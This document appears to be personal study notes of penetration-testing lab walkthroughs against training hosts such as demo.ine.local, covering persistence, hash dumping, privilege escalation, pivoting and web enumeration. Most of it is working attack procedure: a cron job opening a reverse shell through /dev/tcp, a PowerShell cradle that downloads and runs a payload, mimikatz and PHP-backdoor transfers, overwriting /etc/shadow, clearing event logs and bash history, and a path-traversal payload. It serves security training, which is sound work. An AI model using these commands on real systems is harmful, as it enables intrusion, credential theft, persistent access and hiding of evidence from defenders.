        
        Initial SSH Credentials:
        
        | Username | Password | | student | password |
        
        **Objective:** Maintain access on the target machine after the credentials are modified. Use SSH related artifacts for this. Retrieve flag from the target machine.
        
        Tools:
        
        - Nmap
        - SSH client
        
        ```bash
        nmap demo.ine.local
        #ssh port22 is open 
        #ssh uer: student pass: password
        
        ssh student@demo.ine.local
        Enter password “password”
        
        ssh>ls -al
        ls -al .ssh/
        #Enumerate files present in home directory.
        #SSH key pair is present in the “.ssh” directory.
        
        #Exit SSH session and copy ssh private key to attacker machine.
        scp student@demo.ine.local:~/.ssh/id_rsa .
        Enter password “password”.
        
        # SSH into student machine and delete the wait file.
        ssh student@demo.ine.local
        Enter password “password”
        
        rm wait
        #The SSH session is terminated
        #SSH into the target machine with the private key.
        
        chmod 400 id_rsa
        ssh -i id_rsa student@demo.ine.local
        
        #retrieve the flag
        
        ls -l
        cat flag.txt
        
        ```
        
        In this lab, we looked at how we can maintain access on the target machine after the credentials are modified using SSH related artifacts.
        
    - ***T118: Local Job Scheduling (cron jobs)***
        
        Local Job Scheduling refers to the ability to create pre-scheduled and periodic background jobs using various mechanism (e.g cron, launchd). Adversaries may use task scheduling to execute programs at system startup or on a scheduled basis for persistence.
        
        **Reference:** https://attack.mitre.org/techniques/T1053/
        
        In this lab environment, you will be provided with GUI access to a Kali machine. The target machine will be accessible at **demo.ine.local**.
        
        You are provided with SSH access on the target machine. The flag is not on the machine yet and will only be available in the user's home directory after "wait" file present in the user's home directory is deleted. However, the deletion of this file will change the user password and restart SSH. Hence, to retrieve the flag, you have to maintain access on the target system.
        
        Initial SSH Credentials:
        
        | Username | Password | | student | password |
        
        **Objective:** Maintain access on the target machine after the credentials are modified. Schedule a popular HTTP python server module to achieve this. Finally, retrieve the flag from the target machine.
        
        Tools:
        
        - Nmap
        - SSH client
        - Python
        
        ```bash
        nmap demo.ine.local
        #ssh port 22
        #The SSH login credentials are provided in the challenge description: - Username: student - Password: password
        ssh student@demo.ine.local
        Enter password “password”
        
        **ps -eaf**
        #Check the running processes.
        #Cron service is running.
        
        # Create a cron job which will use the SimpleHTTPServer python module to serve the files present in student user’s home directory.
        echo "* * * * * cd /home/student/ && python -m SimpleHTTPServer" > cron
        crontab -i cron
        crontab -l
        #exit the session 
        #login and delete the wait file
        
        ssh student@demo.ine.local
        Enter password “password”
        
        rm wait
        #ssh session is terminated
        #Use nmap to scan for open ports. Since the HTTP server was started, port 8000 should be open.
        nmap -p- demo.ine.local
        
        curl demo.ine.local:8000
        curl demo.ine.local:8000/flag.txt
        #retrieve the flag
        
        ```
        
    - ***Windows: NTLM Hash Cracking***
        
        In this lab, you'll learn to perform security testing on a Windows system by identifying and exploiting vulnerabilities to crack NTLM hashes. You will use tools like Nmap and Metasploit to scan, identify, and exploit the target Windows machine, demonstrating how to escalate privileges and extract sensitive information.
        
        In this lab environment, you will be provided with GUI access to a Kali machine. The target machine will be accessible at **demo.ine.local**.
        
        **Objective:** To exploit a vulnerable Windows server, extract NTLM hashes, and attempt to crack these hashes.
        
        **Flag1: Administrator User Password**
        
        **Flag2: Bob User Password**
        
        Tools:
        
        - Nmap
        - msfconsole
        
        ```bash
        
        nmap -sV -p 80 demo.ine.local
        #We will search the exploit module for badblue 2.7 using searchsploit.
        searchsploit badblue 2.7
        
        /etc/init.d/postgresql start
        msfconsole -q
        use exploit/windows/http/badblue_passthru
        set RHOSTS demo.ine.local
        exploit
        #We have successfully exploited a badblue server.
        
        #meterpreter>getuid    //not NT
        migrate -N lsass.exe
        #got NT authority
        hashdump
        # Use an auxiliary ntlm hash cracking module to crack stored NTLM hashes.
        
        background
        creds
        
        **use auxiliary/analyze/crack_windows**
        set CUSTOM_WORDLIST /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
        exploit
        
        #This revealed the flag to us:
        Administrator: password
        bob: password1
        
        @@I tried
        
        # Create administrator hash file
        echo "Administrator:8846f7eaee8fb117ad06bdd830b7586c" > admin_hash.txt
        
        # Create bob hash file  
        echo "bob:5835048ce94ad0564e29a924a03510ef" > bob_hash.txt
        
        # Create combined file for batch cracking
        echo "Administrator:8846f7eaee8fb117ad06bdd830b7586c" > all_hashes.txt
        echo "bob:5835048ce94ad0564e29a924a03510ef" >> all_hashes.txt
        john --format=NT --wordlist=/usr/share/wordlists/metasploit/unix_passwords.txt all_hashes.txt
        
        #got pass
        
        ```
        
    - ***CTF 2***
        
        This lab involves exploiting a Windows target machine. By identifying insecure configurations, cracking hashes, and leveraging privilege escalation techniques, you'll uncover and capture the flags. Challenges include exploiting an insecure SSH user, cracking password hashes, escalating privileges and overcoming restricted access to files.
        
        Skill Check Labs are interactive, hands-on exercises designed to validate the knowledge and skills you’ve gained in this course through real-world scenarios. Each lab presents practical tasks that require you to apply what you’ve learned. Unlike other INE labs, solutions are not provided, challenging you to demonstrate your understanding and problem-solving abilities. Your performance is graded, allowing you to track progress and measure skill growth over time.
        
        A target machine is accessible at **target.ine.local.** Identify the services and capure the flags.
        
        - **Flag 1:** An insecure ssh user named **alice** lurks in the system.
        - **Flag 2:** Using the hashdump file discovered in the previous challenge, can you crack the hashes and compromise a user?
        - **Flag 3:** Can you escalate privileges and read the flag in C://Windows//System32//config directory?
        - **Flag 4:** Looks like the flag present in the Administrator's home denies direct access.
        
        The following will be useful:
        
        - **Wordist:** /usr/share/wordlists/metasploit/unix_passwords.txt
        - **Tool:** /root/Desktop/PrintSpoofer.exe
        - Nmap
        - Hydra
        - JohnTheRipper
        - PrintSpoofer
        
        ```bash
        
        **//Flag1**
        
        hydra -l alice -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt ssh://target.ine.local
        #got port 22 user:alice pass: princess1
        #or use msf ssh_login 
        
        ssh alice@target.ine.local
        pass:princess1
        dir
        type flag1.txt
        #got first flag
        
        **//Flag2**
        
        shell.alice> type hashdump.txt
        
        nano hashdump.txt
        #use the John tool to crack them with the command
        john --format=NT hashdump.txt
        #got usr:david pass:orange and alice:princess1
        
        ssh david@target.ine.local
        pass:orange
        #got david shell
        dir
        type flag2.txt
        
        **//Flag3**
        
        shell.david> whoami /priv
        
        #very imprt for understanding how to escalate priv
        #We have SeImpersonatePrivilege, so we can easily elevate our privileges using PrintSpoofer.
        #The PrintSpoofer executable is already available on our local machine in the /root/Desktop directory
        
        #copy it to our SSH session using the command
        scp PrintSpoofer64.exe david@target.ine.local:"C:\\Users\\david\\"
        
        #successfully transferred the file shell.david
        david>dir
        david> PrintSpoofer64.exe -i -c cmd
        #execute this file 
        
        SeImpersonatePrivilege in Windows to escalate privileges. Here's a breakdown of its components:
        PrintSpoofer64.exe → This is the executable file for the PrintSpoofer exploit, which leverages the Print Spooler service to escalate privileges.
        -i → Runs the command in interactive mode, allowing the user to interact with the elevated session.
        -c cmd → Specifies the command to execute; in this case, it launches cmd.exe (Command Prompt) with elevated privileges.
        
        cd config
        dir
        type flag3.txt
        
        **//Flag4**
        
        **cd C:\Users\Administrator**
        #dir
        #cd flag : it has no permission
        #check the permissions using the command:
        **icacls flag**
        This command displays the Access Control List (ACL) for the flag directory
        it has a deny permission for NT AUTHORITY\SYSTEM
        Let's remove this restriction by using the command
        
        icacls flag /remove:d "NT AUTHORITY\SYSTEM"
        #successfully changed the permission
        cd flag
        type flag4.txt
        
        ```
        
    
    - ***Password Cracker: Linux***
        
        Auxiliary modules in the Metasploit Framework are versatile components used to perform a wide range of tasks that do not necessarily involve exploiting a vulnerability. These tasks can include scanning, enumeration, fuzzing, cracking hashes, and other network-related activities. Auxiliary modules are an essential part of the penetration testing process as they help gather information, identify potential targets, and assess the security posture of systems and networks.
        
        In this lab environment, you will be provided with GUI access to a Kali machine. The target machine running a vulnerable application will be accessible at **demo.ine.local**.
        
        **Objective:** Run the following auxiliary module against the target:
        
        - auxiliary/analyze/crack_linux
        
        Tools:
        
        - Nmap
        - Metasploit Framework
        
        ```bash
        nmap -sS -sV demo.ine.local
        #discovered a proftpd 1.3.3c server running on the target machine
        nmap --script vuln -p 21 demo.ine.local
        #The target proftpd installation has been running a backdoored version.
        
        /etc/init.d/postgresql start
        #We will start the postgresql database server on the attacker machine. We are starting postgresql to store all metasploit loot and other sensitive information from the target machine.
        msfconsole -q
        or
        
        service postgresql start && msfconsole
        use exploit/unix/ftp/proftpd_133c_backdoor
        set payload payload/cmd/unix/reverse
        set RHOSTS demo.ine.local
        set LHOST 192.70.114.2
        exploit -z
        
        #exploited the target ftp server.
        
        use post/linux/gather/hashdump
        set SESSION 1
        exploit
        #post exploitation module to dump the system users hashes
        
        use auxiliary/analyze/crack_linux
        set SHA512 true
        run
        #Run the provided auxiliary module to find the plain text password of the root user.
        This reveals the flag to us.
        
        Flag: password
        
        ```
        
    - ***Pivoting***
    - ***Clearing Your Tracks On Windows***
        
        Clearing tracks after exploiting a system is a crucial step for attackers who want to avoid detection and maintain access. Metasploit, a popular framework for developing and executing exploit code against a remote target machine, also includes techniques that can be used to cover tracks after an exploit.
        
        In this lab environment, you will be provided with GUI access to a Kali machine and a target Windows machine. The target machine running a vulnerable application will be accessible at **demo.ine.local**.
        
        **Objective:** Your task is to exploit the vulnerable application and then clear the Windows Event logs with Metasploit.
        
        - Nmap
        - Metasploit Framework
        
        ```bash
        
        nmap -sV demo.ine.local
        # vulnerable version of BadBlue running on port 80 that can be exploited through the use of a Metasploit module.
        msfconsole
        use exploit/windows/http/badblue_passthru
        set RHOSTS demo.ine.local
        exploit
        #got meterpreter session
        
        clearev
        
        # Clearing Windows Event logs.
        #Whenever you successfully gain access to a Windows target, 
        #all of your activity is being logged in the form of Windows events. 
        #Meterpreter provides you with the ability to clear the entire Windows Event log. 
        #This can be done by running the following command:
        
        ```
        
    - ***Clearing Your Tracks On Linux***
        
        Clearing tracks on a target machine is a critical step in penetration testing to ensure that the activities conducted during the test do not leave any evidence that could be detected later. In this lab, we will learn about the process of clearing your tracks on a Linux system.
        
        In this lab environment, you will be provided with GUI access to a Kali machine. The target machine will be accessible at **demo.ine.local**.
        
        **Objective:** Clear your tracks on a Linux system by deleting the bash history.
        
        - Nmap
        - Metasploit Framework
        
        ```bash
        nmap -Pn -A -T4 demo.ine.local
        #port 445 samba
        nmap -sV -p 445 demo.ine.local
        #vulnerable version of SAMBA that can be exploited through the use of a Metasploit module is running on port 445.
        
        mfsconsole -q
        use exploit/linux/samba/is_known_pipename
        set RHOSTS demo.ine.local
        exploit
        /bin/bash -i
        #got shell
        
        #Clearing tracks on Linux.
        #Whenever you successfully gain access to a Linux target, all of your activity is being logged in the form of bash history. We can clear the bash history by running the following command:
        history -c
        cat /dev/null > ~/.bash_history
        #We can also clear the bash history by deleting the content of the .bash_history file. This can be done by running the following command:
        
        ```
        
        In this lab, we explored the process of clearing your tracks on a Linux system by deleting the bash history of the user you currently have access to.
        
    
    - Local Enumeration
        - Windows
            - `nmap -sV 10.2.16.155`
            - `service postgresql start && msfconsole -q`
            - Exploit rejetto
            - Got meterpreter session
            - `getuid`
            - `sysinfo`
            - `show_mount`
            - `cat C:\\Windows\\System32\\eula.txt`
            - `shell`
            - `hostname`
            - `systeminfo`
            - `wmic qfe get Caption,Description,HotFixID,InstalledOn`
            - cd C:\\
            - exit
            - meterpreter>cd C:\\
            - cd Windows
            - cd System32
            
            **Enumerating Users & Groups - Windows**
            
            rejetto 
            
            meterpreter>shell
            
            - `getuid - Admin already`
            - `getprivs`
            - current logged-on users `query user`
            - Display all accounts - `net users`
            - `net user Administrator`
            - Enumerate groups `net localgroup`
            - `net localgroup Administrators`
            - `net localgroup "Remote Desktop Users”`
            
            **Enumerating Network Information - Windows**
            
            meterpreter>shell
            
            - `ipconfig
            ipconfig /all`
            - `route print` - display routing table
            - arp table - `arp -a`
            - Listening connections/ ports - `netstat -ano`
            - Firewall state - `netsh firewall show state`
            - netsh advfirewall firewall
            - netsh advfirewall
            
            **Enumerating Processes and Services**
            
            rejetto 
            
            meterperter>
            
            - running procesess - `ps`
            - `pgrep explorer.exe`   //value has means service are running . if no  , no services
            - `migate 744`
            - sysinfo
            - shell
            - `wmic service list brief`
            - running tasks - `tasklist /SVC`
            - schtasks /query /fo  LIST /v
            - 
            
            **Automation** 
            
            JAWS : Just Another Windows (enum) Scripts
            
            - https://github.com/411Hall/JAWS
            - meterpreter>
            - Run this command in powershell `PS C:\temp> .\jaws-enum.ps1 -OutputFileName Jaws-Enum.txt`
            - Go to msfconsole session back
            - `session 1
            cd C:\\
            mkdir Temp
            cd Temp
            upload /root/Desktop/jaws-enum.ps1
            shell`
            - query user
            - net users
            - net user administrator
            - `powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename Jaws-Enum.txt`
            
            meterpreter>
            
            - `download Jaws-Enum.txt`
            
            **Metasploit** 
            
            - `use exploit/windows/winrm/winrm_script_exec`
            - set rhost ip
            - set USERNANE administrator
            - set PASSWORD tinkerbell
            - set FORCE_VBS true
            - exploit
            - meterpreter>sysinfo, getuid
            - show_mount
            - background
            - `use post/windows/gather/win_privs`
            - set SESSION 1
            - run
            - `use post/windows/gather/enum_logged_on_users`
            - `use post/windows/gather/checkvm`
            - set SESSION 2
            - run
            - `use post/windows/gather/enum_applications`
            - set SESSION 1
            - run
            - `use post/windows/gather/enum_computers`
            - set SESSION 1
            - run
            - `use post/windows/gather/enum_patches`
            - `use post/windows/gather/enum_shares`
        - Linux
            
            **Enumerating System Information**
            
            ifconfig eth1 second ip:
            
            - `nmap -sV 192.218.227.3`
            - Exploit vsftpd
            - `use exploit/unix/ftp/vsftpd_234_backdoor`
            - Get shell
            - ls
            - `/bin/bash -i`
            - background
            - Update shell session to meterpreter
            - `sessions -u 1`
            - `sessions 2`
            - `getuid`
            - `sysinfo`
            - `shell
            /bin/bash -i
            cd /root`
            - `hostname`
            - `cat /etc/issue`
            - `cat /etc/*release`
            - `uname -a`
            - `env`
            - `lscpu`
            - `free -h`
            - `df -h`
            - `lsblk | grep sd`
            
            #dpkg -l
            
            **Enumerating Users and Groups Linux**
            
            meterpreter>shell
            
            /bin/bash -i 
            
            cd /root
            
            - `whoami`
            - `id`
            - `ls -al /home
            cat /etc/passwd`
            - `cat /etc/passwd | grep -v /nologin`
            - `groups root`
            - `ifconfig`
            - `netstat`
            - `route`
            - `arp`
            
            **Enumerating Network Information:**
            
            meterpreter>
            
            >netstat
            
            >route
            
            - `shell
            /bin/bash -i`
            - ip a s
            - `cat /etc/networks`
            - cat /etc/hostname
            - `cat /etc/hosts`
            - `cat /etc/resolv.conf`
            - `arp -a`
            - `ps`
            - `ps aux`
            - `cat /etc/cron*`
            - `crontab -l`
            - **Enumerating Processes & Cron Jobs*************
                
                ```bash
                ifconfig eth1 3
                msfconsole
                setg rhosts ip
                search vsftpd
                use 1
                exploit
                sessions
                sessions -u 1
                sessions
                sessions 2
                **meterpreter>**?
                ps
                pgrep vsftpd
                shell
                /bin/bash -i
                >
                ps aux
                exit
                
                msf:
                ps
                ps aux
                ps aux | grep msfconsole
                ps aux | grep root
                sessions
                sessions 1
                exit
                top              top utility
                
                sessions 1
                /bin/bash -i
                
                #
                crontab -1
                exit
                
                msf:
                crontab -1
                ls -al /etc/cron*
                cat /etc/cron*
                
                ```
                
            
            **Automation** 
            
            - https://github.com/rebootuser/LinEnum
            
            ```bash
            ifconfig
            nmap -sV ip
            //apache httpd
            http://ip/gettime.cgi
            ...goto the msf in below and exploit shellshock
            ```
            
            - 
            - `./LinEnum.sh -s -k keyword -r report -e /tmp/ -t`
            - Go back to meterpreter session
            - `session 1
            cd /tmp
            upload /root/Desktop/LinEnum.sh
            shell
            /bin/bash -i`
            - `id`
            - `chmod +x [LinEnum.sh](http://linenum.sh/)
            ./LinEnum.sh`
            
            **Metasploit**
            
            - `nmap -sV 192.19.208.3`
            - Exploit shellshock
            - `service postgresql start && msfconsole -q
            search shellshock
            use exploit/multi/http/apache_mod_cgi_bash_env_exec
            setg RHOSTS 192.19.208.3
            setg RHOST 192.19.208.3
            set TARGETURI /gettime.cgi
            run`
            - meterpreter>background
            
            - `use post/linux/gather/enum_configs`
            - `use post/linux/gather/enum_network`
            - cat Path_use_diff_try
            - `use post/linux/gather/enum_system`
            - `use post/linux/gather/checkvm`
            - meterpreter>pwd
            - cd /tmp
            - ls
            - got to automation linenum
        
    - **Transferring Files**
        - Setting Up A Web Server with Python
            
            ```bash
            ls -al /usr/share/windows-binaries/
            ls -al /usr/share/windows-resourses/mimikatz/x64/mimi
            cp ls -al /usr/share/windows-resourses/mimikatz/x64/mimikatz.exe
            
            ls
            python -m SimpleHTTPServer 80    //modules m
            
            //check ip eth1 in web
            //terminated
            python3 -m http.server 80
            //open browser refresh 
            //terminate
            cd Desktop/tools
            
            ```
            
        - Transferring Files to Windows targets
            
            ```bash
            //given target_ip
            nmap -sV -p 80 ip
            //output: port 80 HttpFileServer httpd 2.3
            
            searchsploit rejetto
            pwd
            searchsploit -m 39161
            ls -als
            vim 39161.py
            //need to edit ip_addr: kali_linux_ip_eth1 and port:1234
            //:wq
            //tab2
            nc -nvlp 1234
            
            //new tab3
            cd  /usr/share/windows-binaries
            ls
            python3 -m http.server 80
            
            //another tab1
            python 39161.py ip 80
            
            //tab 2
            //got the shell
            >whoami
            whoami /priv
            
            //tab3
            exit
            ls -al /usr/share/windows-resourses/mimikatz/x64
            ls
            
            //tab2
            //navigate c drive
            cd C:\\
            dir
            mkdir Temp
            cd Temp
            
            //tab3
            python3 -m http.server 80
            
            //tab2
            certutil -urlcache -f http://ip/mimikatz.exe mimikatz.exe
            dir
            
            .\mimikatz.exe
            
            #privilege::debug
            lsadump::sam
            exit
            
            //tab3
            exit
            cd /root
            wim text.txt
            //this is some data
            
            //tab2
            certutil -urlcache -f http://kali_ip/test.txt test.txt
            dir
            type test.txt
            
            ```
            
        - Transferring Files to Linux targets
            
            ```bash
            ifconfig
            nmap -sV ip
            tmux            //multi terminal in one terminal
            //CntrlV and c
            ifconfig
            msfconsole
            setg rhost ip
            search samba
            use exploit/linux/is_known_pipename
            exploit
            
            /bin/bash -i
                    
            id
            cat /etc/*release
             pwd 
             ls
             
             
             //new terminal ctrl v and c
             
             cd /usr/share/webshells
             ls
             cd php
             ls
             ifconfig
             python3 -m http.server 80 
             //ctrl v and 0
             
            tmp# ls
            wget http://ip/php-backdoor.php  
            ls
            
            exit
            cd /root
            echo "this is some test" > test.txt
            cat test.txt
            ```
            
    - **Shells**
        - Upgrading Non Interactive Shells
            
            ```bash
            ifconfig eth1 3
            msfconsole
            setg rhosts ip
            search samba
            use exploit/linux/samba/is_known_pipename
            exploit
            
            ls
            pwd
            /bin/bash -i
            #exit
            
            cat /etc/shells
            /bin/sh -i
            ls
            pwd
            exit
            python --version
            python -c 'import pty; pty.spawn("/bin/bash")'
            #perl --help
            exit
            
            perl -e 'exec "/bin/bash";'
            
            ls
            ruby: exex "/bin/bash"
            /bin/bash -i
            #env
            
            export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
            env
            
            export TERM=xterm
            expert SHELL = bash
            env
            ls -alps
            wget
            
            ```
            
    - Privilege Escalation
        - Windows
            
            **Identifying windows Privilege Escalation Vulnerabilities**
            
            github: PrivescCheck
            
            - `nmap -sV 10.2.29.53`
            - `service postgresql start && msfconsole -q`
            - `setg RHOSTS 10.2.29.53
            setg RHOST 10.2.29.53`
            - `search web_delivery
            use exploit/multi/script/web_delivery`
            - `set target PSH\ (Binary)
            set payload windows/shell/reverse_tcp
            set PSH-EncodedCommand false
            set LHOST eth1
            exploit`
            - //copy the powershell.exe code
            - cmd right click and enter
            - `powershell.exe -nop -w hidden -c [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;$z="echo ($env:temp+'\P4MPrq7y.exe')"; (new-object System.Net.WebClient).DownloadFile('[http://10.10.24.2:8080/y3MMtnMlRkQ81pA](http://10.10.24.2:8080/y3MMtnMlRkQ81pA)', $z); invoke-item $z`
            - go the msf:
            - `sessions 1`
            - `whoami`
            - `background
            search shell_to
            use post/multi/manage/shell_to_meterpreter
            set LHOST eth1
            set SESSION 1
            show advanced
            set WIN_TRANSFER VBS
            options`
            - `run
            sessions 2`
            - meterpreter>sysinfo
            - `ps
            migrate 5048    //explorer
            get privs`
            - `cd C:\\Users\\student\\Desktop\\PrivescCheck
            shell
            dir`
            - `powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck”`
            - `powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report PrivescCheck_%COMPUTERNAME%”`
            - `exit
            meterpreter > download PrivescCheck_ATTACKDEFENSE.txt`
            - [**`psexec.py](http://psexec.py/) [administrator@10.2.29.53](mailto:administrator@10.2.29.53) cmd.exe`**
            - `cd C:\Users\Administrator\Desktop
            dir
            type flag.txt`
        - Linux
            
            
            - `whoami`
            - `find / -not -type l -perm -o+w`
            - `s -l /etc/shadow
            cat /etc/shadow`
            - cat /etc/groups
            - `openssl passwd -1 -salt abc password123`
            - `vim /etc/shadow`  copy and put the pass hash in root:
            - `su`
            - `cd
            ls
            cat flag`
            - **Misconfigured sudo***********
            - cat /etc/passwd
            - `sudo -l`
            - `sudo man ls`
            - `sudo man cat`
            - `find / -user root -perm -4000 -exec ls -ldb {} \;`
            - `find / -perm -u=s -type f 2>/dev/null`
            - `sudo -l`
            - `sudo man ls`
            - `!/bin/bash`
            
            elevated priv :
            
            ls
            
            cd /root
            
            ls
            
            cat flag
            
            - got root
            - get the flag
    - Persistence
        
        **Windows**
        
        **Persistence Via Services**
        
        - `nmap -sV 10.2.20.244`
        - Exploit rejetto
        - Got meterpreter sessions
        - `sysinfo`
        - `getuid`
        - `background
        search platform:windows persistence
        use exploit/windows/local/persistence_service
        info
        set payload windows/meterpreter/reverse_tcp
        set LPORT 4443
        sessions
        set SESSION 3
        run`
        - meterpreter>getuid          :NT auth
        - Kill all MSF sessions
        - `sessions -K`
        - `exit`
        - `msfconsole -q
        use multi/handler
        options
        set payload windows/meterpreter/reverse_tcp
        set LHOST eth1
        set LPORT 4444
        run`
        - meterpreter>getuid      : NT auth
        
        **Persistence Via RDP** 
        
        - `service postgresql start && msfconsole -q`
        - `db_status
        setg RHOSTS 10.2.20.249
        setg RHOST 10.2.20.249
        workspace -a RDP_persistence
        db_nmap -sV 10.2.20.249`
        - `use exploit/windows/http/badblue_passthru
        run`
        - meterpreter>
        - `sysinfo`
        - `getuid`     \administrator
        - `pgrep explorer
        migrate 3132`
        - `run getgui -e -u newuser -p attack_1234321`
        - exit
        - #
        - **`xfreerdp /u:newuser /p:attack_1234321 /v:10.2.20.249`**
        
        //windows and run cmd as admin > whoami /priv 
        
        - Meterprer run this command - run `multi_console_command -r /root/.msf4/logs/scripts/getgui/clean_up__20230429.4245.rc`
        
        **Linux**
        
        **Persistence via SSH Keys**
        
        - ifconfig
        - `ssh [student@192.3.140.3](mailto:student@192.3.140.3)` use password: password
        - `ls -al`
        - `cat wait`
        - `cd .ssh
        ls`
        - `cat id_rsa`
        - `cat authorized_keys`
        - exit
        - `scp [student@192.3.140.3](mailto:student@192.3.140.3):~/.ssh/id_rsa .`
        - ls -al
        `chmod 400 id_rsa`
        - `ssh [student@192.3.140.3](mailto:student@192.3.140.3)
        rm wait`    /after few sec wait
        - `ssh -i id_rsa [student@192.3.140.3](mailto:student@192.3.140.3)`
        
        cat flag
        
        **Persistence via     ***Cron Jobs****
        
        - ifconfig eth1 3
        - `ssh [student@192.175.36.3](mailto:student@192.175.36.3)`
        - ls -al
        - `cat wait`
        - `cat /etc/cron*`
        - `echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/192.175.36.2/1234 0>&1'" > cron`
        - cat cron
        - `crontab -i cron
        crontab -l`
        - logback again
        - `ssh [student@192.175.36.3](mailto:student@192.175.36.3)
        rm wait`
        - `nc -nvlp 1234`
        - ls -al
        - cat flag.txt
        
    - Dumping & Cracking
        
        **Windows**
        
        **Dumping and Cracking NTLM Hashes**
        
        - `nmap -sV -p 80 10.2.24.37`
        - `service postgresql start && msfconsole -q`
        - Exploit badblue  passthru
        - Got meterpreter session
        - `sysinfo`
        - `getuid`  admin  not NT
        - `get privs`
        - `pgrep lsass
        migrate 688`
        - `hashdump`
        - //copy the admin and bob hashes
        - //new tab
        - cd Desktop
        - vim hashes.txt         //past the hashes
        - cat hashes.txt
        - `john --list=formats | grep NT`
        - `john --format=NT hashes.txt`
        - `john --format=NT hashes.txt`
        - `john --format=NT hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt`
        - `hashcat -a 3 -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt`
        - `hashcat -a 3 -m 1000 --show hashes.txt /usr/share/wordlists/rockyou.txt`
        - **`xfreerdp /u:Administrator /p:password /v:10.2.24.37`**
        
        **Linux Password Hashes**
        
        ifconfig eth1 3
        
        - `nmap -sV 192.22.107.3`
        - `service postgresql start && msfconsole -q`
        - Exploit proftpd backdoor
        - `/bin/bash -i`
        - `cat /etc/shadow`
        - `use post/linux/gather/hashdump`
        - run
        - cat /root….24.txt
        - exit -y
        - #
        - gzip -d /usr/share/wordlists/rockyou.txt.gz
        - `john --format=sha512crypt /root/.msf4/loot/20230429153134_default_192.22.107.3_linux.hashes_083080.txt --wordlist=/usr/share/wordlists/rockyou.txt`
        
        **with hashcat::**
        
        - hashcat —hlep | grep 1800
        - `hashcat -a 3 -m 1800 /root/.msf4/loot/20230429153134_default_192.22.107.3_linux.hashes_083080.txt /usr/share/wordlists/rockyou.txt`
    - Pivoting
        - `service postgresql start && msfconsole`
        - `workspace -a Pivoting`
        - `db_nmap -sV -p- -O <Victim1IP>`
        - `services`
        - `search rejetto`
        - `use exploit/windows/http/rejetto_hfs_exec`
        - `show options`
        - `set rhosts <Victim1IP>`
        - `run`
        - Got Meterpreter session
        - `sysinfo`
        - `getuid`
        - `ipconfig`
        - `run autoroute -s <Victim2IP/24>`
        - run this in background
        - `background`
        - rename the session 1 meterpreter
        - `sessions -n victim1 -i 1`
        - `sessions`
        - Now portscan
        - `search portscan`
        - `use auxiliary/scanner/portscan/tcp`
        - `show options`
        - `set rhosts Victim2iP`
        - `exploit`
        - Port 80 open port found on victim2
        - Now go to session in metereter
        - `sessions 1`
        - `portfwd add -l 1234 -p 80 -r <Victim2IP>`
        - Now again put this session in background
        - `background`
        - `db_nmap -sV -sS -p 1234 localhost`
        - `search badblue`
        - `use exploit/windows/http/badblue_passthru`
        - `show options`
        - `set payload windows/meterpreter/bind_tcp`
        - `set rhosts <Victim2IP>`
        - `set LPORT 4433`
        - `run`
        - got meterpreter session
        - Observe that this is 2016 and old is 2012
        - get flag
    - Pivoting MSF part
        
        ```bash
        fist ping 2 ip and check
        victim_1 : ip
        victim_2 : ip(cannot communicate with kali)
        
        service postgresql start && msfconsole
        workspace -a Pivoting
        db_nmap -sV -p- -O <Victim1IP>
        services
        search **rejetto**
        use exploit/windows/http/rejetto_hfs_exe
        show options
        set rhosts <Victim1IP>
        run
        Got Meterpreter session
        sysinfo
        getuid            //admin not NT auth
        ipconfig                   //interface 12 ip subnet
        **run autoroute -s <Victim2IP/24>**
        run autoroute -p
        //run this in background
        background
        rename the session 1 meterpreter
        sessions -n victim1 -i 1
        sessions
        -Now portscan
        search portscan
        use auxiliary/scanner/portscan/tcp
        show options
        set rhosts Victim2iP
        //set PORTS 1-100
        exploit
        //Port 80 open port found on victim2
        -Now go to session in metereter
        sessions 1
        **portfwd add -l 1234 -p 80 -r <Victim2IP>**
        - Now again put this session in background
        background
        db_nmap -sV -sS -p 1234 localhost
        search **badblue**
        use exploit/windows/http/badblue_passthru
        show options
        set payload windows/meterpreter/bind_tcp
        set rhosts <Victim2IP>
        set LPORT 4433
        run
        got meterpreter session
        sessions
        //here is 2 session
        sessions -n victim-2 -i 2
        sessions
        sessions 2
        meterpreter>sysinfo
        Observe that this is 2016 and old is 2012
        get flag
        ```
        
    
    - **Clearing**
        - Clearing Your Tracks On Windows
        - Clearing Your Tracks On Linux

# Web Application Penetration Testing 15%

**Q.**

- **Identify vulnerabilities in web applications**
- **Locate hidden file and directories**
- **Conduct brute-force login attack**
- **Conduct web application reconnaissance**

**Web & HTTP Protocols**

1. Request methods
2. Status codes

**Directory Enumeration - [Go buster & Burp suite]**

1. `sudo apt update && sudo apt install -y gobuster`
2. `gobuster dir -u [http://192.21.23.23](http://192.21.23.23) -w /usr/share/wordlists/dirb/common.txt` 
3. `gobuster dir -url [http://192.21.23.23](http://192.21.23.23) -w /usr/share/wordlists/dirb/common.txt -b 403,404 -x .php,.xml,.txt -r` 
4. `gobuster dir -url [http://192.21.23.23](http://192.21.23.23)/data -w /usr/share/wordlists/dirb/common.txt -b 403,404 -x .php,.xml,.txt -r`

1. Turn on burp
2. capture the GET / request and send to Intruder 
3. User burp custom wordlists, or select for your wish 
4. start attack 

**Scanning web application - [ZAP & Nikto]**

1. Zap manual and automatic scan 
2. Nikto scan- `nikto -h [http://192.157.60.3](http://192.157.60.3/) -o niktoscan-192.157.60.3.txt`
3. `nikto -h [http://192.157.60.3/index.php?page=arbitrary-file-inclusion.php](http://192.157.60.3/index.php?page=arbitrary-file-inclusion.php) -Tuning 5 -o nikto.html -Format htm`
4. `firefox nikto.html`
5. [`http://192.157.60.3/index.php/index.php?page=../../../../../../../../../../etc/passwd`](http://192.157.60.3/index.php/index.php?page=../../../../../../../../../../etc/passwd)

**Passive Crawling with Burp suite**

1. Turn on burp
2. Check HTTP history and crawl endpoints
3. Add target and scan it 

**SQL Injection- sqlmap**

1. [http://192.42.186.3/sqli_1.php?title=hacking&action=search](http://192.42.186.3/sqli_1.php?title=hacking&action=search)
